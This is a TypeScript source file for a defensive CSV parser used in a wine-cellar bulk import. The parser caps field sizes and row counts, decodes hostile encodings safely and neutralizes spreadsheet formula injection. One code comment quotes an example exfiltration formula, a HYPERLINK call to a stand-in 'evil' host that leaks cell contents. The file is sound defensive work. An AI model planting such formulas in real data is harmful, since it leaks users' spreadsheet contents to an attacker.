// G1-4 — defensive CSV parsing for cellar bulk import.
//
// No CSV dependency exists elsewhere in this repo (src/lib/scanner/csv.ts
// and src/lib/export/toast-csv.ts only ever WRITE csv, and are owned by
// the scanning domain this slice must not touch). This is a small,
// hand-rolled RFC4180-ish parser rather than a new dependency: parsing an
// uploaded file is exactly the kind of surface (formula injection, huge
// fields, hostile encodings) where keeping full control is worth more
// than the few dozen lines a library would save.

import { MAX_FIELD_LENGTH, MAX_ROWS } from "./constants";

export type CsvParseError = {
  code: "too_many_rows" | "field_too_long" | "empty_file" | "unterminated_quote";
  message: string;
  rowNumber?: number;
};

export type CsvParseResult =
  | { ok: true; header: string[]; rows: string[][] }
  | { ok: false; error: CsvParseError };

// Characters Excel/Sheets/LibreOffice treat as the start of a formula
// when they lead a cell. A hostile producer/name like
// `=HYPERLINK("http://evil/?"&A1)` would otherwise execute the moment
// this data is ever opened in a spreadsheet (e.g. via a future export).
// Neutralized at ingest, once, so every downstream consumer of this
// data — preview, the persisted batch row, any later export — sees it
// as inert text instead of relying on every future consumer to escape
// it correctly.
const FORMULA_LEAD = /^[=+\-@\t\r]/;

function neutralizeFormulaLead(value: string): string {
  return FORMULA_LEAD.test(value) ? `'${value}` : value;
}

/**
 * Decode an uploaded file's bytes as UTF-8, tolerating a BOM and
 * replacing (never throwing on) invalid byte sequences — a hostile or
 * simply wrong-encoding upload must fail cleanly downstream (as
 * validation errors on the resulting garbled cells), not crash the
 * request.
 */
export function decodeCsvBuffer(buffer: Buffer): string {
  const decoder = new TextDecoder("utf-8", { fatal: false });
  let text = decoder.decode(buffer);
  if (text.charCodeAt(0) === 0xfeff) text = text.slice(1);
  return text;
}

/**
 * Parse CSV text into a header row + data rows of raw string cells.
 * Quoted fields (commas, quotes doubled as `""`, and embedded newlines)
 * are handled per RFC4180. Every cell is length-capped and
 * formula-lead-neutralized as it's read.
 */
export function parseCsv(text: string): CsvParseResult {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let inQuotes = false;
  let i = 0;
  const len = text.length;
  let dataRowCount = 0;

  function pushField() {
    if (field.length > MAX_FIELD_LENGTH) {
      throw new FieldTooLongError(rows.length + 1);
    }
    row.push(neutralizeFormulaLead(field));
    field = "";
  }

  function pushRow() {
    pushField();
    // Skip fully blank trailing lines (common at end of file).
    if (row.length === 1 && row[0] === "") {
      row = [];
      return;
    }
    rows.push(row);
    row = [];
    if (rows.length > 1) {
      dataRowCount += 1;
      if (dataRowCount > MAX_ROWS) {
        throw new TooManyRowsError();
      }
    }
  }

  try {
    while (i < len) {
      const char = text[i];

      if (inQuotes) {
        if (char === '"') {
          if (text[i + 1] === '"') {
            field += '"';
            i += 2;
            continue;
          }
          inQuotes = false;
          i += 1;
          continue;
        }
        field += char;
        i += 1;
        continue;
      }

      if (char === '"' && field === "") {
        inQuotes = true;
        i += 1;
        continue;
      }
      if (char === ",") {
        pushField();
        i += 1;
        continue;
      }
      if (char === "\r") {
        i += 1;
        continue;
      }
      if (char === "\n") {
        pushRow();
        i += 1;
        continue;
      }
      field += char;
      i += 1;
    }

    if (inQuotes) {
      return {
        ok: false,
        error: { code: "unterminated_quote", message: "A quoted field is never closed." },
      };
    }

    // Final field/row if the file doesn't end with a newline.
    if (field !== "" || row.length > 0) pushRow();
  } catch (err) {
    if (err instanceof TooManyRowsError) {
      return {
        ok: false,
        error: {
          code: "too_many_rows",
          message: `File has more than ${MAX_ROWS} data rows.`,
        },
      };
    }
    if (err instanceof FieldTooLongError) {
      return {
        ok: false,
        error: {
          code: "field_too_long",
          message: `A cell exceeds the ${MAX_FIELD_LENGTH}-character limit.`,
          rowNumber: err.rowNumber,
        },
      };
    }
    throw err;
  }

  if (rows.length === 0) {
    return { ok: false, error: { code: "empty_file", message: "File is empty." } };
  }

  const [header, ...dataRows] = rows;
  return { ok: true, header, rows: dataRows };
}

class TooManyRowsError extends Error {}
class FieldTooLongError extends Error {
  constructor(readonly rowNumber: number) {
    super("field too long");
  }
}
